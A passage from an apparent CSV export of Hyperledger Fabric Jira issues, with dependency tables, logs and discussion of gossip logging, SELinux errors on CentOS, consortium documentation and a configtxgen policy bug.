|protobuf|3.3.0|3.3.0|3.3.0|
|*pyasn1*| |0.2.3| |
|pycparser|2.18|2.18|2.18|
|*pykafka*|2.6.0| | |
|*pyOpenSSL*|16.2.0|16.2.0|17.1.0|
|pysha3|1.0b1|1.0b1|1.0b1|
|*python-dateutil*|2.2|2.2| |
|python-slugify|1.2.4|1.2.4|1.2.4|
|*pytz*|2014.3|2014.3| |
|*PyYAML*|3.10|3.10|3.12|
|*requests*|2.4.3|2.4.3| |
|six|1.10.0|1.10.0|1.10.0|
|*tabulate*|0.7.7| | |
|Unidecode|0.4.21|0.4.21|0.4.21|
|*urllib3*| |1.21.1| |
|*Werkzeug*|0.12.2|0.12.2| |;;;","18/Jul/17 5:09 PM;ynamiki;`make behave` works well in 2967a0b with attached [^pip-requirements.txt].
|| ||Script||Document||Read Me||requirements||
|asn1crypto|0.22.0|0.22.0|0.22.0|0.22.0|
|b3j0f.aop|0.8.4|0.8.4|0.8.4|0.8.4|
|b3j0f.utils|1.4.4|1.4.4|1.4.4|1.4.4|
|*beautifulsoup4*|4.6.0| | | |
|behave|1.2.5|1.2.5|1.2.5|1.2.5|
|cffi|1.10.0|1.10.0|1.10.0|1.10.0|
|*CouchDB*|1.0|1.0| | |
|cryptography|1.9|1.9|1.9|2.0|
|ecdsa|0.13|0.13|0.13|0.13|
|enum34|1.1.6|1.1.6|1.1.6|1.1.6|
|*Flask*|0.10.1|0.10.1| | |
|*Flask-Cors*|2.0.1|2.0.1| | |
|futures|3.1.1|3.1.1|3.1.1|3.1.1|
|*gevent*|1.2.2| | | |
|*google*|1.9.3| | | |
|*greenlet*|0.4.12| | | |
|*grpcio*|0.13.1|1.4.0|1.4.0|1.4.0|
|*grpcio-tools*| |1.4.0|1.4.0| |
|idna|2.5|2.5|2.5|2.5|
|ipaddress|1.0.18|1.0.18|1.0.18|1.0.18|
|*itsdangerous*|0.24|0.24| | |
|Jinja2|2.9.6|2.9.6|2.9.6|2.9.6|
|*kazoo*|2.4.0| | | |
|MarkupSafe|1.0|1.0|1.0|1.0|
|*ndg-httpsclient*| |0.4.2| | |
|*nose*|1.3.7|1.3.7| | |
|ordereddict|1.1|1.1|1.1|1.1|
|parse|1.8.2|1.8.2|1.8.2|1.8.2|
|parse-type|0.3.4|0.3.4|0.3.4|0.3.4|
|protobuf|3.3.0|3.3.0|3.3.0|3.3.0|
|*pyasn1*| |0.2.3| | |
|pycparser|2.18|2.18|2.18|2.18|
|*pykafka*|2.6.0| | | |
|*pyOpenSSL*|16.2.0|16.2.0|17.1.0|17.1.0|
|pysha3|1.0b1|1.0b1|1.0b1|1.0.2|
|*python-dateutil*|2.2|2.2| | |
|python-slugify|1.2.4|1.2.4|1.2.4|1.2.4|
|*pytz*|2014.3|2014.3| | |
|*PyYAML*|3.10|3.10|3.12|3.12|
|*requests*|2.4.3|2.4.3| | |
|six|1.10.0|1.10.0|1.10.0|1.10.0|
|*tabulate*|0.7.7| | | |
|Unidecode|0.4.21|0.4.21|0.4.21|0.4.21|
|*urllib3*| |1.21.1| | |
|*Werkzeug*|0.12.2|0.12.2| | |;;;","24/Jul/17 8:37 PM;ynamiki;https://gerrit.hyperledger.org/r/11775;;;","27/Oct/17 1:15 AM;markparz;added some reviewers to your CR;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Gossip: Generate DEBUG log when a gossip message is dropped due to buffer overflow,FAB-5293,19217,,Task,Closed,FAB,Fabric,software,denyeart,,,Low,Done,yacovm,AdnanChoudhury,AdnanChoudhury,13/Jul/17 12:55 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,17/Jul/17 5:16 PM,v1.0.0,,,v1.0.1,v1.1.0,fabric-gossip,,,,,,0,gossip,gossip_component,quality,,,,"Gossip connection has buffer at both the ends, and when a send buffer is full, it will drop any newly-generated outgoing packet. There should be a debug log when a a message is dropped due to buffer overflow.",,AdnanChoudhury,mastersingh24,scottz,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-5342,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy867:",,,,,,,,,,,,,,,,,,,,,,,AdnanChoudhury,mastersingh24,scottz,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,release-1.0,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"13/Jul/17 1:25 AM;yacovm;[~C0rWin] [~gennadyl] ^;;;","13/Jul/17 10:48 PM;scottz;Alternatively, we could COUNT the drops, and provide an interface to query this along with any other types of failure counters that could be helpful to analyze problems with each peer's behavior.

This might be better in terms of using limited resources. If we are dropping msgs due to overflow, generating more debug logs might not be the best use of overwhelmed CPU.;;;","16/Jul/17 10:17 PM;yacovm;https://gerrit.hyperledger.org/r/#/c/11671/;;;","17/Jul/17 5:16 PM;mastersingh24;I'm going to mark this as target 1.0.1 and 1.1 - we can decide if this goes is ok for a patch release or if we wait for the next minor release (1.1);;;","18/Jul/17 12:11 AM;scottz;Due to the following reasons, as explained by Yacov, we are ok to accept log as debug level:
 * since dropped msgs can be an expected behavior in an overloaded peer
 * since the target peer that does not receive the msg could get it from another source
 * since there are other FAB issues open already to create counters / metrics, which would include pegs for dropped msgs such as this

Also, I am creating another FAB to followup, to remove the incorrect English word ""overflown"".;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Docker compose files in fabric-samples create the same containers,FAB-5296,19225,,Story,Closed,FAB,Fabric,software,denyeart,,,Low,Won't Do,,tkuhrt,tkuhrt,13/Jul/17 7:31 AM,23/Jan/20 6:53 AM,28/Oct/23 3:00 AM,23/Jan/20 6:53 AM,v1.0.0,,,,,fabric-samples,,,,,,0,stale-item,,,,,,The Docker compose files for all fabric-samples create the same containers. This makes it impossible for someone to switch back and forth between the examples without first stopping all running processes.,,sykesm,tkuhrt,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy87r:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,sykesm,tkuhrt,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"23/Jan/20 6:53 AM;sykesm;Stale;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
CentOS and SELinux result in error running samples,FAB-5297,19226,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,tkuhrt,tkuhrt,13/Jul/17 7:37 AM,23/Jan/20 6:54 AM,28/Oct/23 3:00 AM,23/Jan/20 6:54 AM,v1.0.0,,,,,fabric-samples,,,,,,0,stale-item,,,,,,"Error referenced below was caused by SELinux on CentOS. The error was resolved with the following command:

{{sudo setenforce 0}}

{{Docker was running with: --selinux-enabled}}

{{root 1041 1 0 Jul11 ? 00:00:18 /usr/bin/dockerd-current --add-runtime oci=/usr/libexec/docker/docker-runc-current --default-runtime=oci --containerd /run/containerd.sock --exec-opt native.cgroupdriver=systemd --userland-proxy-path=/usr/libexec/docker/docker-proxy-current --selinux-enabled --log-driver=journald}}

*Recommend adding a note to the docs somewhere for people running CentOS.*

Log for bringing up Dev Mode environment

{{$ docker-compose -f docker-compose-simple.yaml up}}
{{Starting orderer}}
{{Starting peer}}
{{Starting chaincode}}
{{Starting cli}}
{{Attaching to orderer, peer, chaincode, cli}}
{{orderer | 2017-07-12 19:45:21.359 UTC [orderer/main] main -> INFO 001 Starting orderer:}}
{{orderer | Version: 1.0.0}}
{{orderer | Go version: go1.7.5}}
{{orderer | OS/Arch: linux/amd64}}
{{*peer | 2017-07-12 19:45:22.220 UTC [main] main -> ERRO 001 Cannot run peer because error when setting up MSP from directory /etc/hyperledger/msp: err Could not load a valid signer certificate from directory /etc/hyperledger/msp/signcerts, err Could not read directory open /etc/hyperledger/msp/signcerts: permission denied, err /etc/hyperledger/msp/signcerts*}}
{{orderer | 2017-07-12 19:45:21.398 UTC [bccsp_sw] openKeyStore -> DEBU 002 KeyStore opened at [/etc/hyperledger/msp/keystore]...done}}
{{orderer | 2017-07-12 19:45:21.398 UTC [bccsp] initBCCSP -> DEBU 003 Initialize BCCSP [SW]}}
{{orderer | 2017-07-12 19:45:21.399 UTC [msp] getPemMaterialFromDir -> DEBU 004 Reading directory /etc/hyperledger/msp/signcerts}}
{{*orderer | 2017-07-12 19:45:21.399 UTC [orderer/main] initializeLocalMsp -> CRIT 005 Failed to initialize local MSP: Could not load a valid signer certificate from directory /etc/hyperledger/msp/signcerts, err Could not read directory open /etc/hyperledger/msp/signcerts: permission denied, err /etc/hyperledger/msp/signcerts*}}
{{*cli | h: ./[script.sh|http://script.sh/]: Permission denied*}}
{{orderer exited with code 1}}
{{peer exited with code 1}}
{{cli exited with code 126}}",,sykesm,tkuhrt,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy87z:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,sykesm,tkuhrt,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"23/Jan/20 6:54 AM;sykesm;Stale;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
document multi-host networking requirements,FAB-5298,19229,28766,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,ChristopherFerris,ChristopherFerris,13/Jul/17 10:00 PM,23/Jan/20 6:54 AM,28/Oct/23 3:00 AM,23/Jan/20 6:54 AM,v1.0.0,,,v1.3.0,,fabric-docs,,,,,,0,stale-item,,,,,,"[https://chat.hyperledger.org/channel/fabric-documentation?msg=jN62FGGfpv4B6JvTi]

 

 ",,asuchit,ChristopherFerris,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzwtxj:",,,,,,,,,,,,,,,,,,,,,,,asuchit,ChristopherFerris,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"23/Jan/20 6:54 AM;sykesm;Stale;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
LTE tool: introduce CouchDB capability,FAB-5301,19234,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,AdnanChoudhury,AdnanChoudhury,AdnanChoudhury,14/Jul/17 12:35 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,22/Sep/17 3:48 AM,,,,,,fabric-quality,,,,,,0,quality,,,,,,"In the LTE tool, introduce capability to run the tests in CouchDB, in addition to the default goleveldb. ",,AdnanChoudhury,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy88v:",,,,,,,,,,,,,,,,,,,,,,,AdnanChoudhury,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,release-2.4,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,,,,,,true,"18/Jul/17 12:10 AM;AdnanChoudhury;https://gerrit.hyperledger.org/r/#/c/11619/;;;","22/Sep/17 3:48 AM;AdnanChoudhury;merged in new test repo.
https://gerrit.hyperledger.org/r/#/c/12307/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fabcar app UI ,FAB-5302,19237,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,odowdaibm,yuleeandrea,yuleeandrea,14/Jul/17 3:37 AM,10/Jan/20 1:25 AM,28/Oct/23 3:00 AM,10/Jan/20 1:25 AM,v1.0.0-alpha2,,,,,fabric-docs,,,,,,0,Documentation,,,,,,"The app UI created for this doc -

[http://fabricstaging.readthedocs.io/en/latest/write_first_app.html]

Need a fabcar app UI in “Writing Your First App” for demonstrating how Fabric apps work. ",,yuleeandrea,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,432000,432000,,0%,432000,432000,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"14/Jul/17 5:45 AM;yuleeandrea;first app_UI.pdf;https://jira.hyperledger.org/secure/attachment/11672/first+app_UI.pdf",,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy89b:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,yuleeandrea,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"14/Jul/17 6:37 AM;yuleeandrea;FYI - [~seanbarclay] [~lucie] [~joe-alewine] [~dlesaca]
We took the advice from [~odowdaibm] : visualizing the first app UI for users. As it's point to visually show the ledger and have simple controls to do the four different main features/functions: query all, query a car, create car and change owner. This is still an early stage of the UI/wires, we are seeking comments/feedback/questions before going any further. Thanks in advance.

Here's the rough UI/wires for the fabcar app on mural board: [https://app.mural.ly/t/ibmblockchain6461/m/ibmblockchain6461/1499806474825]

And a prototype on Invision:
 [https://ibm.invisionapp.com/share/CMCJJ7HZP]

first app_UI pdf has been attached to this ticket for a quick review.
 [^first app_UI.pdf];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
trademark guidelines violation in README,FAB-5304,19240,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,ChristopherFerris,ChristopherFerris,ChristopherFerris,14/Jul/17 4:11 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,27/Jul/17 7:11 PM,v1.0.0,,,v1.0.1,,fabric-docs,,,,,,0,,,,,,,number of trademark guideline violations in the main README,,ChristopherFerris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy89j:",,,,,,,,,,,,,,,,,,,,,,,ChristopherFerris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"14/Jul/17 4:19 AM;ChristopherFerris;https://gerrit.hyperledger.org/r/11633;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
PTE supports admin_cert from config json,FAB-5306,19243,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,dongming,dongming,dongming,14/Jul/17 4:37 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,03/Aug/17 11:11 PM,,,,,,fabric-quality,,,,,,1,PTE,quality,,,,,"HSBN pte.sjon includes priv and admic_cert.  PTE will check the presence of admin_cert in the org in the pte.json, it present, then read cert from json file, otherwise, read cert from the files in adminPath directory.",,dongming,holocron,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-2247,,,,,,,,,"1|hzy89r:",,,,,,,,,,,,,,,,,,,,,,,dongming,holocron,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"14/Jul/17 4:41 AM;holocron;This is required to run PTE in an environment such as HSBN where one would not have the MSP contents at hand.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
multiple PTEs management for density benchmark,FAB-5307,19244,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,dongming,dongming,dongming,14/Jul/17 4:57 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,03/Aug/17 11:12 PM,,,,,,fabric-quality,,,,,,0,PTE,quality,,,,,"For density test, multiple PTEs will be executed simultaneously.  All processes from all PTEs need to start at the same time for performance benchmark.

 

Create a pte_mgr.sh to manage all PTEs.  The pte_mgr determines a starting time, then sends the starting time to each PTE to execute transactions simultaneously. ",,dongming,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-2247,,,,,,,,,"1|hzy89z:",,,,,,,,,,,,,,,,,,,,,,,dongming,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Documentation on use of Consortium ,FAB-5308,19247,,Documentation,To Do,FAB,Fabric,software,denyeart,,,High,,nickgaski,rhegde,rhegde,14/Jul/17 5:18 AM,04/May/20 11:52 AM,28/Oct/23 3:00 AM,,,,,,,fabric-docs,,,,,,2,Release-planning-1.1,,,,,,"{color:#1f497d}Hello Gari, {color}

{color:#1f497d} {color}

{color:#1f497d}This is what I had explained on call, a-week back. The same test was run to understand consortium however the explanation I understood from Kostas – All the organization must be part of Consortium.{color}

{color:#1f497d} {color}

{color:#1f497d}Am I doing something incorrect?{color}

{color:#1f497d} {color}

*+{color:#1f497d}E2E CLI Changes{color}+*

[{color:#0000ff}developer@rahul-Inspiron-3442:~/workspace/playtime/go-workspace/src/github.com/hyperledger/fabric/examples/e2e_cli${color}|mailto:developer@rahul-Inspiron-3442:~/workspace/playtime/go-workspace/src/github.com/hyperledger/fabric/examples/e2e_cli$] git diff configtx.yaml
diff --git a/examples/e2e_cli/configtx.yaml b/examples/e2e_cli/configtx.yaml
index e60d789..e7d64f3 100644
— a/examples/e2e_cli/configtx.yaml
+++ b/examples/e2e_cli/configtx.yaml
@@ -23,7 +23,6 @@ Profiles:
             SampleConsortium:
                 Organizations:
                     - *Org1
-                    - *Org2
     TwoOrgsChannel:
         Consortium: SampleConsortium
         Application:{color}

*+{color:#1f497d}Peer CLI Log{color}+*

{color:#000000}Channel name : mychannel
Creating channel...
CORE_PEER_TLS_ROOTCERT_FILE=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/peers/peer0.org1.example.com/tls/ca.crt
CORE_PEER_TLS_KEY_FILE=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/peers/peer0.org1.example.com/tls/server.key
CORE_PEER_LOCALMSPID=Org1MSP
CORE_VM_ENDPOINT=unix:///host/var/run/docker.sock
CORE_PEER_TLS_CERT_FILE=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/peers/peer0.org1.example.com/tls/server.crt
CORE_PEER_TLS_ENABLED=true
CORE_PEER_MSPCONFIGPATH=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp
CORE_PEER_ID=cli
CORE_LOGGING_LEVEL=DEBUG
CORE_PEER_ADDRESS=peer0.org1.example.com:7051
2017-06-26 15:30:24.333 UTC [msp] getMspConfig -> INFO 001 intermediate certs folder not found at [/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp/intermediatecerts]. Skipping.: [stat {color}{color:#0000ff}/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp/intermediatecerts{color}{color:#000000}: no such file or directory]
2017-06-26 15:30:24.333 UTC [msp] getMspConfig -> INFO 002 crls folder not found at [/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp/intermediatecerts]. Skipping.: [stat {color}{color:#0000ff}/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp/crls{color}{color:#000000}: no such file or directory]
2017-06-26 15:30:24.333 UTC [msp] getMspConfig -> INFO 003 MSP configuration file not found at [/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp/config.yaml]: [stat {color}{color:#0000ff}/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp/config.yaml{color}{color:#000000}: no such file or directory]
2017-06-26 15:30:24.366 UTC [msp] GetLocalMSP -> DEBU 004 Returning existing local MSP
2017-06-26 15:30:24.366 UTC [msp] GetDefaultSigningIdentity -> DEBU 005 Obtaining default signing identity
2017-06-26 15:30:24.370 UTC [channelCmd] InitCmdFactory -> INFO 006 Endorser and orderer connections initialized
2017-06-26 15:30:24.371 UTC [msp] GetLocalMSP -> DEBU 007 Returning existing local MSP
2017-06-26 15:30:24.371 UTC [msp] GetDefaultSigningIdentity -> DEBU 008 Obtaining default signing identity
2017-06-26 15:30:24.371 UTC [msp] GetLocalMSP -> DEBU 009 Returning existing local MSP
2017-06-26 15:30:24.371 UTC [msp] GetDefaultSigningIdentity -> DEBU 00a Obtaining default signing identity
2017-06-26 15:30:24.371 UTC [msp/identity] Sign -> DEBU 00b Sign: plaintext: 0AA4060A074F7267314D53501298062D...53616D706C65436F6E736F727469756D 
2017-06-26 15:30:24.371 UTC [msp/identity] Sign -> DEBU 00c Sign: digest: 25DD46F4291249DE8BB3D45CB16D4BB7F257C1826A88BD988E547C815FE1E19C 
2017-06-26 15:30:24.371 UTC [msp] GetLocalMSP -> DEBU 00d Returning existing local MSP
2017-06-26 15:30:24.371 UTC [msp] GetDefaultSigningIdentity -> DEBU 00e Obtaining default signing identity
2017-06-26 15:30:24.371 UTC [msp] GetLocalMSP -> DEBU 00f Returning existing local MSP
2017-06-26 15:30:24.371 UTC [msp] GetDefaultSigningIdentity -> DEBU 010 Obtaining default signing identity
2017-06-26 15:30:24.371 UTC [msp/identity] Sign -> DEBU 011 Sign: plaintext: 0ADB060A1508021A060890D1C4CA0522...F64740C447F69E4AD319F0D58274A7B6 
2017-06-26 15:30:24.371 UTC [msp/identity] Sign -> DEBU 012 Sign: digest: B0ACAD2C001218A3C469D5D09FE6BA68A97C8C5F07DA0D0C8B4A06A6857F8926 
Error: Got unexpected status: BAD_REQUEST
Usage:
  peer channel create [flags]
 
Global Flags:
  -b, --blockpath string           Path to file containing genesis block
      --cafile string              Path to file containing PEM-encoded trusted certificate(s) for the ordering endpoint
  -c, --chain string               In case of a newChain command, the chain ID to create.
  -f, --file string                Configuration transaction file generated by a tool such as configtxgen for submitting to orderer
      --logging-level string       Default logging level and overrides, see core.yaml for full syntax
  -o, --orderer string             Ordering service endpoint
      --test.coverprofile string   Done (default ""coverage.cov"")
  -t, --timeout int                Channel creation timeout (default 5)
      --tls                        Use TLS when communicating with the orderer endpoint
  -v, --version                    Display current version of fabric peer server
 
!!!!!!!!!!!!!!! Channel creation failed !!!!!!!!!!!!!!!!
================== ERROR !!! FAILED to execute End-2-End Scenario =================={color}

{color:#000000} {color}

*+{color:#1f497d}Orderer Log{color}+*

{color:#000000}2017-06-26 15:30:24.374 UTC [orderer/configupdate] Process -> DEBU 0c8 Processing channel creation request for channel mychannel
2017-06-26 15:30:24.375 UTC [orderer/common/broadcast] Handle -> WARN 0c9 Rejecting CONFIG_UPDATE because: Attempted to include a member which is not in the consortium
2017-06-26 15:30:24.399 UTC [orderer/common/deliver] Handle -> WARN 0ca Error reading from stream: rpc error: code = Canceled desc = context canceled{color}

{color:#000000} {color}",,conanoc,fredbi,jufeng.yao,mastersingh24,mplisov,nickgaski,rhegde,TiantianGao,yeyc.linuxf,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy8gv:",,,,,,,,,,,,,,,,,,,,,,,conanoc,fredbi,jufeng.yao,mastersingh24,mplisov,nickgaski,rhegde,TiantianGao,yeyc.linuxf,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"14/Jul/17 5:24 AM;rhegde;[~mastersingh24] mentioned this is a 2-Step process and we are awaiting.;;;","19/Jul/17 6:06 AM;Clayton Sims;Nick this is important to CLS.   Perhaps we can work directly with CLS to understand and improve this piece of the doc;;;","19/Jul/17 10:15 PM;nickgaski;Is the goal here to update the consortium on the system channel or simply to add an org to an existing application channel? My initial understanding was that since channels exist in the purview of a consortium, then the actual consortium would have to be updated on the system level.  However, Jason has explained that this is fact not the case.  You can still add an org to an application channel without updating the consortium at large. ;;;","22/Jul/17 12:06 AM;rhegde;Understanding Consortium Usage - As per my understanding, only those organization added to the consortium, has authority to create channel. I have changed the e2e to add only Org1 however channel creation fails upon using the Org1 admin MSP.

Understanding new organization to either system channel or application channel will be nice to understand.

 ;;;","11/Aug/19 6:21 PM;mastersingh24;The net-net here is that it's not obvious from the docs that you can actually add an organization which does not belong to the consortium to a channel.  The caveat is that you cannot do this on channel create; you must do a channel update after the the channel has initially been created.;;;","04/May/20 11:52 AM;conanoc;It would be helpful to add a tutorial explaining how to add an Org to a consortium. There are questions like this: [https://stackoverflow.com/questions/58622606/add-a-new-org-to-the-existing-consortium-hyperledger-fabric];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"configtxgen does not appropriately set the ""mod_policy"" for the application policies for new channels",FAB-5309,19248,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jyellick,sandp125,sandp125,14/Jul/17 6:45 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,19/Jul/17 7:12 PM,v1.0.0,,,v1.0.1,,fabric-tools,,,,,,0,quality,,,,,,"configtxgen sets the ""mod_policy"" for  ""/Channel/Application/*.policies"" to {{""""}}, rather than to {{""Admins""}} as you would expect. As a result of this, any config update on these policies is failing with error ""{color:#ff0000}Rejecting CONFIG_UPDATE because: Error authorizing update: Error validating DeltaSet: Unexpected missing policy for item [Policy] /Channel/Application/Admins{color}"". 

